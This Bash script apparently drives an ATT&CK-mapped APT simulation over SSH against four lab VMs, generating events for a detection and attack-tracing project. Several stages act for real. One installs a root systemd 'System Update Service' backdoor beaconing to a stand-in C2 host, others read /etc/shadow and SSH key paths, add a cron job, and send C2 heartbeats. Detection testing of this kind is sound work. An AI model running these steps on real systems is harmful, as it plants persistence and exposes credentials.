#!/bin/bash
#
# APT 攻击模拟脚本 - 手动执行版本
# 
# 使用 Atomic Red Team 测试在 4 个虚拟机上模拟 APT 攻击
# 适用于教学演示和安全测试
#
# 作者：Attack Trace Analyzer 项目组
# 日期：2025-01-16
#

set -e  # 遇到错误立即退出

# ========================================
# 配置区域 - 请根据你的环境修改
# ========================================

# 虚拟机配置（改成你的虚拟机 IP）
VICTIM_01="ubuntu@192.168.1.11"
VICTIM_02="ubuntu@192.168.1.12"
VICTIM_03="ubuntu@192.168.1.13"
VICTIM_04="ubuntu@192.168.1.14"

# 等待时间（秒）- 每个攻击阶段后等待，让中心机采集数据
WAIT_TIME=20

# 日志文件
LOG_FILE="./apt_manual_$(date +%Y%m%d_%H%M%S).log"

# ========================================
# 工具函数
# ========================================

# 日志函数
log() {
    local msg="[$(date '+%Y-%m-%d %H:%M:%S')] $1"
    echo "$msg"
    echo "$msg" >> "$LOG_FILE"
}

# 在远程主机执行命令
remote_exec() {
    local host=$1
    local command=$2
    local description=$3
    
    log "========================================="
    log "在 $host 上执行: $description"
    log "========================================="
    
    ssh "$host" "$command" 2>&1 | tee -a "$LOG_FILE"
    
    log "等待 ${WAIT_TIME} 秒让中心机采集数据..."
    sleep "$WAIT_TIME"
    log ""
}

# ========================================
# 开始执行
# ========================================

log "========================================="
log "APT 攻击剧本 - 手动执行原子测试"
log "========================================="
log ""
log "虚拟机配置："
log "  victim-01: ${VICTIM_01##*@}"
log "  victim-02: ${VICTIM_02##*@}"
log "  victim-03: ${VICTIM_03##*@}"
log "  victim-04: ${VICTIM_04##*@}"
log ""
log "等待时间: ${WAIT_TIME} 秒/阶段"
log ""

# ========================================
# Phase 1: Initial Access on victim-01
# ========================================

log "【Phase 1】Initial Access - victim-01"
log "技术: T1190 - Exploit Public-Facing Application"
log ""

remote_exec "$VICTIM_01" "
    # 模拟 Web Shell 访问
    curl -s http://example.com/webshell.php || true
    logger -t 'APT_ATOMIC' 'T1190: Initial Access via web shell'
    echo 'APT_T1190_MARKER=\$(date +%s)' > /tmp/apt_stage1.txt
    
    echo '[APT] Stage 1 complete: Initial Access'
" "T1190 - Web Shell Initial Access"

# ========================================
# Phase 2: Execution on victim-01
# ========================================

log "【Phase 2】Execution - victim-01"
log "技术: T1059.004 - Unix Shell"
log ""

remote_exec "$VICTIM_01" "
    # Unix Shell 执行
    bash -c 'whoami && uname -a && pwd > /tmp/apt_execution.txt'
    logger -t 'APT_ATOMIC' 'T1059.004: Unix Shell execution'
    echo 'APT_T1059_MARKER=\$(date +%s)' > /tmp/apt_stage2.txt
    
    echo '[APT] Stage 2 complete: Execution'
" "T1059.004 - Unix Shell"

# ========================================
# Phase 3: Persistence on victim-01
# ========================================

log "【Phase 3】Persistence - victim-01"
log "技术: T1053.003 - Create System Service"
log ""

remote_exec "$VICTIM_01" "
    # Create systemd service
    cat > /tmp/apt_backdoor.sh << 'EOF'
#!/bin/bash
while true; do
    curl -s http://c2.attacker-domain.com/heartbeat || true
    sleep 300
done &
EOF
    chmod +x /tmp/apt_backdoor.sh
    
    # 创建 systemd 服务
    sudo tee /etc/systemd/system/apt-backdoor.service > /dev/null << 'EOSVC'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/tmp/apt_backdoor.sh
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOSVC
    
    logger -t 'APT_ATOMIC' 'T1053.003: Systemd service created'
    echo 'APT_T1053_MARKER=\$(date +%s)' > /tmp/apt_stage3.txt
    
    echo '[APT] Stage 3 complete: Persistence'
" "T1053.003 - Systemd Service"

# ========================================
# Phase 4: Credential Access on victim-01
# ========================================

log "【Phase 4】Credential Access - victim-01"
log "技术: T1003.003 - Read /etc/shadow"
log ""

remote_exec "$VICTIM_01" "
    # 读取 /etc/shadow
    sudo cat /etc/shadow 2>/dev/null | head -3 > /tmp/apt_shadow.txt || echo 'Shadow access simulated' > /tmp/apt_shadow.txt
    
    # 查找 SSH 密钥
    find ~/.ssh -name 'id_rsa*' 2>/dev/null > /tmp/apt_ssh_keys.txt || true
    
    logger -t 'APT_ATOMIC' 'T1003.003: /etc/shadow access'
    echo 'APT_T1003_MARKER=\$(date +%s)' > /tmp/apt_stage4.txt
    
    echo '[APT] Stage 4 complete: Credential Access'
" "T1003.003 - Read /etc/shadow"

# ========================================
# Phase 5: Lateral Movement victim-01 → victim-02
# ========================================

log "【Phase 5】Lateral Movement - victim-01 → victim-02"
log "技术: T1021.004 - SSH Remote Services"
log ""

remote_exec "$VICTIM_01" "
    # SSH 横向移动（模拟）
    nc -zv 192.168.1.12 22 2>&1 || true
    curl -s -m 3 http://192.168.1.12:22 2>/dev/null || true
    
    logger -t 'APT_ATOMIC' 'T1021.004: SSH lateral movement to victim-02'
    echo 'APT_T1021_MARKER=\$(date +%s)' > /tmp/apt_stage5.txt
    
    echo '[APT] Stage 5 complete: Lateral Movement to victim-02'
" "T1021.004 - SSH Lateral Movement"

# ========================================
# Phase 6: Discovery on victim-02
# ========================================

log "【Phase 6】Discovery - victim-02"
log "技术: T1083 - File and Directory Discovery"
log ""

remote_exec "$VICTIM_02" "
    # 文件发现
    find /var -type f -name '*.conf' 2>/dev/null | head -20 > /tmp/apt_discovery.txt
    find /etc -type f -name '*config*' 2>/dev/null | head -20 >> /tmp/apt_discovery.txt
    
    logger -t 'APT_ATOMIC' 'T1083: File and directory discovery'
    echo 'APT_T1083_MARKER=\$(date +%s)' > /tmp/apt_victim02_stage1.txt
    
    echo '[APT] Stage 6 complete: Discovery on victim-02'
" "T1083 - File Discovery"

# ========================================
# Phase 7: Collection on victim-02
# ========================================

log "【Phase 7】Collection - victim-02"
log "技术: T1005 - Data from Local System"
log ""

remote_exec "$VICTIM_02" "
    # 数据收集
    cat > /tmp/apt_collected_data.txt << 'EOF'
Database Credentials:
host: localhost
port: 5432
database: production_db
user: dbuser
password: P@ssw0rd123
EOF
    
    tar -czf /tmp/apt_exfil.tar.gz /tmp/apt_discovery.txt /tmp/apt_collected_data.txt 2>/dev/null
    
    logger -t 'APT_ATOMIC' 'T1005: Data collection from local system'
    echo 'APT_T1005_MARKER=\$(date +%s)' > /tmp/apt_victim02_stage2.txt
    
    echo '[APT] Stage 7 complete: Collection on victim-02'
" "T1005 - Data Collection"

# ========================================
# Phase 8: Lateral Movement victim-02 → victim-03
# ========================================

log "【Phase 8】Lateral Movement - victim-02 → victim-03"
log "技术: T1077.004 - Job Scheduling (Cron)"
log ""

remote_exec "$VICTIM_02" "
    # 创建 cron 任务进行横向移动
    cat > /tmp/apt_cron_lateral.sh << 'EOF'
#!/bin/bash
# 横向移动脚本
nc -zv 192.168.1.13 22 2>&1 || true
logger -t 'APT_ATOMIC' 'T1077.004: Cron job lateral movement to victim-03'
echo 'APT_T1077_MARKER=\$(date +%s)' > /tmp/apt_cron_marker.txt
EOF
    chmod +x /tmp/apt_cron_lateral.sh
    
    # 立即执行一次
    /tmp/apt_cron_lateral.sh
    
    # 添加到 crontab
    (crontab -l 2>/dev/null; echo '* * * * * /tmp/apt_cron_lateral.sh') | crontab -
    
    echo 'APT_T1077_SETUP_MARKER=\$(date +%s)' > /tmp/apt_victim02_stage3.txt
    
    echo '[APT] Stage 8 complete: Lateral Movement to victim-03'
" "T1077.004 - Cron Job Lateral Movement"

# ========================================
# Phase 9: Privilege Escalation on victim-03
# ========================================

log "【Phase 9】Privilege Escalation - victim-03"
log "技术: T1068.001 - Exploitation for Privilege Escalation"
log ""

remote_exec "$VICTIM_03" "
    # 查找 SUID 文件
    find / -perm -4000 -type f 2>/dev/null | head -20 > /tmp/apt_suid_bins.txt
    
    # 模拟提权
    cat > /tmp/apt_priv_esc.sh << 'EOF'
#!/bin/bash
echo 'Simulating privilege escalation...'
sudo bash -c 'echo \"APT_ROOT_ACCESS=\$(date +%s)\" > /root/apt_root_marker.txt' 2>/dev/null || echo 'Root access simulated' > /tmp/apt_root_sim.txt
logger -t 'APT_ATOMIC' 'T1068.001: Privilege escalation via SUID'
echo 'APT_T1068_MARKER=\$(date +%s)' > /tmp/apt_priv_esc_done.txt
EOF
    chmod +x /tmp/apt_priv_esc.sh
    /tmp/apt_priv_esc.sh
    
    echo 'APT_T1068_MARKER=\$(date +%s)' > /tmp/apt_victim03_stage1.txt
    
    echo '[APT] Stage 9 complete: Privilege Escalation'
" "T1068.001 - SUID Privilege Escalation"

# ========================================
# Phase 10: Lateral Movement victim-03 → victim-04
# ========================================

log "【Phase 10】Lateral Movement - victim-03 → victim-04 (DC)"
log "技术: T1558.003 - Kerberoasting"
log ""

remote_exec "$VICTIM_03" "
    # Kerberoasting 模拟
    cat > /tmp/apt_kerberoasting.sh << 'EOF'
#!/bin/bash
echo 'Simulating Kerberoasting attack...'
echo 'Requesting service ticket for HTTP/victim-04.lab.local'
echo 'Cracking Kerberos ticket...'
nc -zv 192.168.1.14 88 2>&1 || true
curl -s -m 3 http://192.168.1.14:88 2>/dev/null || true
logger -t 'APT_ATOMIC' 'T1558.003: Kerberoasting to victim-04'
echo 'APT_T1558_MARKER=\$(date +%s)' > /tmp/apt_kerberoasting_done.txt
EOF
    chmod +x /tmp/apt_kerberoasting.sh
    /tmp/apt_kerberoasting.sh
    
    echo 'APT_T1558_MARKER=\$(date +%s)' > /tmp/apt_victim03_stage2.txt
    
    echo '[APT] Stage 10 complete: Lateral Movement to victim-04'
" "T1558.003 - Kerberoasting"

# ========================================
# Phase 11: Command & Control on victim-04
# ========================================

log "【Phase 11】Command & Control - victim-04"
log "技术: T1071.001 - Web Traffic (C2)"
log ""

remote_exec "$VICTIM_04" "
    # C2 通信
    cat > /tmp/apt_c2_agent.sh << 'EOF'
#!/bin/bash
for i in {1..5}; do
    curl -s http://c2.attacker-domain.com/heartbeat?host=victim-04&attempt=\$i 2>/dev/null || true
    sleep 2
done
logger -t 'APT_ATOMIC' 'T1071.001: Web C2 traffic'
echo 'APT_T1071_MARKER=\$(date +%s)' > /tmp/apt_c2_done.txt
EOF
    chmod +x /tmp/apt_c2_agent.sh
    /tmp/apt_c2_agent.sh
    
    echo 'APT_T1071_MARKER=\$(date +%s)' > /tmp/apt_victim04_stage1.txt
    
    echo '[APT] Stage 11 complete: Command & Control'
" "T1071.001 - Web C2 Traffic"

# ========================================
# Phase 12: Impact on victim-04
# ========================================

log "【Phase 12】Impact - victim-04"
log "技术: T1485 - Data Destruction"
log ""

remote_exec "$VICTIM_04" "
    # 数据破坏（模拟）
    cat > /tmp/apt_impact.txt << 'EOF'
=== APT IMPACT STAGE ===
Timestamp: \$(date)
Host: victim-04 (Domain Controller)
Action: Data destruction (simulated)
Status: Complete
EOF
    
    logger -t 'APT_ATOMIC' 'T1485: Data destruction on Domain Controller'
    echo 'APT_T1485_MARKER=\$(date +%s)' > /tmp/apt_victim04_stage2.txt
    
    echo '=========================================='
    echo 'ALL ATTACK STAGES COMPLETE'
    echo '=========================================='
" "T1485 - Data Destruction"

# ========================================
# 完成
# ========================================

log ""
log "========================================="
log "APT 攻击剧本执行完成！"
log "========================================="
log ""
log "检查标记文件："
log ""
ssh "$VICTIM_01" "ls -la /tmp/apt_*_marker.txt /tmp/apt_stage*.txt 2>/dev/null | head -5"
ssh "$VICTIM_02" "ls -la /tmp/apt_victim02_*.txt 2>/dev/null | head -5"
ssh "$VICTIM_03" "ls -la /tmp/apt_victim03_*.txt 2>/dev/null | head -5"
ssh "$VICTIM_04" "ls -la /tmp/apt_victim04_*.txt 2>/dev/null | head -5"
log ""
log "日志文件: $LOG_FILE"
log ""
log "下一步："
log "  1. 打开前端: http://localhost:3000"
log "  2. 查看事件搜索"
log "  3. 查看图谱可视化"
log "  4. 创建溯源任务 (KillChain 分析)"
log ""
log "验证检测："
log "  bash verify_detection.sh"
log ""
